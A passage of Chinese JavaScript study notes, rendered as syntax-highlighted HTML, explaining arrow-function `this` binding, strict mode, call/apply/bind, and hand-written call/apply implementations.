    <span class="token function-variable function">b</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Window {postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, …}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function-variable function">c</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 10</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// {a: 10, b: ƒ, c: ƒ}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function-variable function">d</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 10</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  obj<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  obj<span class="token punctuation">.</span><span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  obj<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p><strong>分析一下代码</strong>，obj.b()中的this会继承父级上下文中的this值，也就是与obj有相同的this指向，为全局变量window。obj.c()的this指向即为调用者obj，obj.d().()中的this也继承自父级上下文中的this，即d的this指向，也就是obj。</p> <blockquote><h4 id="箭头函数与普通函数的区别"><a href="#箭头函数与普通函数的区别" class="header-anchor">#</a> 箭头函数与普通函数的区别？</h4></blockquote> <ul><li>1、箭头函数不可作为构造函数，不能使用new</li> <li>2、箭头函数没有自己的this</li> <li>3、箭头函数没有arguments对象</li> <li>4、箭头函数没有原型对象</li></ul> <h4 id="_5-this指向和call-apply-bind"><a href="#_5-this指向和call-apply-bind" class="header-anchor">#</a> 5:this指向和call/apply/bind</h4> <h5 id="严格-模式"><a href="#严格-模式" class="header-anchor">#</a> “严格”模式</h5> <p>严格模式是在代码中引入更好的错误检查的一种方法。use strict是一种ECMAscript 5 添加的（严格）运行模式,这种模式使得 Javascript 在更严格的条件下运行, <strong>提高编译器效率，增加运行速度</strong>；为未来新版本的Javascript标准化做铺垫。</p> <ul><li>当使用严格模式时，<strong>不能使用隐式声明的变量，或为只读属性赋值，或向不可扩展的对象添加属性</strong>；</li> <li>可以通过在文件，程序或函数的开头添加<code>“use strict”</code>来启用严格模式；</li></ul> <p>“use strict”是Es5中引入的js指令。 使用“use strict”指令的目的是强制执行严格模式下的代码。 在严格模式下，咱们不能在不声明变量的情况下使用变量。 早期版本的js忽略了“use strict”。</p> <h5 id="this的指向【要点】"><a href="#this的指向【要点】" class="header-anchor">#</a> this的指向【要点】</h5> <p>由此我们可以得出结论：<strong>普通函数的this总是指向它的直接调用者</strong></p> <ul><li><strong>普通函数的this总是指向它的直接调用者。</strong></li> <li><strong>在严格模式下，没找到直接调用者，则函数中的this是undefined。</strong></li> <li><strong>在默认模式下（非严格模式），没找到直接调用者，则函数中的this指向window。</strong></li> <li><strong>javascript 的this可以简单的认为是后期绑定，没有地方绑定的时候，默认绑定window或undefined。</strong></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">test0</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
    a <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token function-variable function">foo</span> <span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//undefined</span>
  <span class="token comment">//例中setTimeout中的function未被任何对象调用，因此它的this指向还是window对象。</span>
  <span class="token comment">//希望可以在上例的setTimeout函数中使用this要怎么做呢？</span>
<span class="token punctuation">}</span>
<span class="token comment">//方式一：that</span>
<span class="token keyword">function</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
    a <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token function-variable function">foo</span> <span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">var</span> that  <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>that<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//1</span>
<span class="token punctuation">}</span>
<span class="token comment">//方式二：bind</span>
<span class="token keyword">function</span> <span class="token function">test2</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
    a <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token function-variable function">foo</span> <span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//1</span>
<span class="token punctuation">}</span>
<span class="token comment">//方式三：arrow</span>
<span class="token keyword">function</span> <span class="token function">test3</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
    a <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token function-variable function">foo</span> <span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//1</span>
<span class="token punctuation">}</span>

<span class="token comment">// test0()</span>
<span class="token comment">// test1()</span>
<span class="token comment">// test2()</span>
<span class="token function">test3</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br></div></div><blockquote><h4 id="说一下箭头函数this指向问题"><a href="#说一下箭头函数this指向问题" class="header-anchor">#</a> 说一下箭头函数This指向问题？</h4></blockquote> <p>默认<strong>指向在定义它时,它所处的对象</strong>,而不是执行时的对象,定义它的时候,可能环境是window（即继承父级的this）。</p> <h5 id="apply-call和bind"><a href="#apply-call和bind" class="header-anchor">#</a> apply,call和bind</h5> <h6 id="三者区分"><a href="#三者区分" class="header-anchor">#</a> 三者区分</h6> <blockquote><p>1.<strong>IE5之前不支持call和apply, bind是ES5出来的,不支持IE8及以下</strong>;
2.call和apply可以调用函数,改变this,实现继承和借用别的对象的方法;</p></blockquote> <ul><li>对象.apply(新this对象,[实参1,实参2,实参3.....])</li> <li>对象.call(新this对象,实参1,实参2,实参3.....)</li></ul> <p>简单记忆法：<strong>A</strong>用于<code>apply</code>和数组/类数组，<strong>C</strong>用于<code>call</code>和逗号分隔。</p> <p><img src="/rat-summ/assets/img/17-13-55.d7432648.jpg" alt=""></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> numbers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">458</span> <span class="token punctuation">,</span> <span class="token number">120</span> <span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">215</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//这里是最形象的例子使用；</span>
<span class="token keyword">var</span> maxInNumbers <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> numbers<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//458</span>
<span class="token keyword">var</span> maxInNumbers <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">458</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">215</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//458 </span>

<span class="token comment">//数组取最大值</span>
<span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//4</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token operator">...</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//4 【推荐】</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//4</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>
  arr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">prev<span class="token punctuation">,</span> cur<span class="token punctuation">,</span> curIndex<span class="token punctuation">,</span> arr</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> cur<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//4</span>

<span class="token comment">//数组合并功能</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">//[1,2,3,4,5,6]</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">...</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token comment">//[1,2,3,4,5,6]</span>
<span class="token keyword">let</span> arrA <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> arrB <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>
<span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>arrA<span class="token punctuation">,</span> arrB<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//arrA值为[1,2,3,4]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//间接调用函数,改变作用域的this值 2.劫持其他对象的方法</span>
<span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span><span class="token string">&quot;张三&quot;</span><span class="token punctuation">,</span>
  <span class="token function-variable function">logName</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> bar<span class="token operator">=</span><span class="token punctuation">{</span>
  name<span class="token operator">:</span><span class="token string">&quot;李四&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
foo<span class="token punctuation">.</span><span class="token function">logName</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//李四</span>
<span class="token comment">//实质是call改变了foo的this指向为bar,并调用该函数</span>

<span class="token comment">//两个函数实现继承</span>
<span class="token keyword">function</span> <span class="token function">Animal</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>   
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">showName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>   
  <span class="token punctuation">}</span>   
<span class="token punctuation">}</span>   
<span class="token keyword">function</span> <span class="token function">Cat</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
  <span class="token function">Animal</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>    
<span class="token keyword">var</span> cat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token string">&quot;Black Cat&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
cat<span class="token punctuation">.</span><span class="token function">showName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Black Cat</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>bind是function的一个函数扩展方法; bind以后代码重新绑定了func内部的this指向,<strong>返回一个函数,不会调用方法</strong>；<strong>IE5之前不支持call和apply, bind是ES5出来的,不支持IE8及以下</strong>;</p> <p>通过bind改变this作用域会返回一个新的函数，<strong>这个函数不会马上执行。</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 惰性载入函数</span>
<span class="token comment">// 函数绑定会占用更多内存，所以只在必要时使用</span>
<span class="token keyword">function</span> <span class="token function">bind</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> context</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//这个设置没有完全考虑到参数；</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token comment">// ES5提供了原生的绑定方法：obj.bind(this);</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">'李四'</span>
<span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;张三&quot;</span><span class="token punctuation">,</span>
    <span class="token function-variable function">logName</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">age</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> fooNew <span class="token operator">=</span> foo<span class="token punctuation">.</span>logName<span class="token punctuation">;</span>
<span class="token keyword">var</span> fooNewBind <span class="token operator">=</span> foo<span class="token punctuation">.</span><span class="token function">logName</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fooNew</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token comment">//李四,10； 注意这里的调用要点；</span>
<span class="token function">fooNewBind</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token comment">//张三,11  因为bind改变了fooNewBind里面的this指向</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h6 id="原理实现【要点】"><a href="#原理实现【要点】" class="header-anchor">#</a> 原理实现【要点】</h6> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">newCall</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">that<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//要点o：参数不一样，处理剩余参数；</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> that <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> that <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     that <span class="token operator">=</span> that <span class="token operator">||</span> window
   <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
     that <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>
   <span class="token punctuation">}</span>
   <span class="token keyword">let</span> fn <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   that<span class="token punctuation">[</span>fn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span> <span class="token comment">//要点一；指向this</span>
   <span class="token keyword">const</span> res <span class="token operator">=</span> that<span class="token punctuation">[</span>fn<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token comment">//要点二；调用函数</span>
   <span class="token keyword">delete</span> that<span class="token punctuation">[</span>fn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//delete that.fn 要点三；移除之前赋值后的，还原that数据；</span>
   <span class="token keyword">return</span> res
 <span class="token punctuation">}</span>

<span class="token keyword">let</span> person <span class="token operator">=</span> <span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">'samy'</span><span class="token punctuation">}</span><span class="token comment">//使用</span>
<span class="token keyword">function</span> <span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token parameter">age<span class="token punctuation">,</span>sex</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
sayHi<span class="token punctuation">.</span><span class="token function">newCall</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// samy 20 男</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">newApply</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">context<span class="token punctuation">,</span> parameter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> context <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> context <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//考虑到默认设置；</span>
    context <span class="token operator">=</span> context <span class="token operator">||</span> window
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    context <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
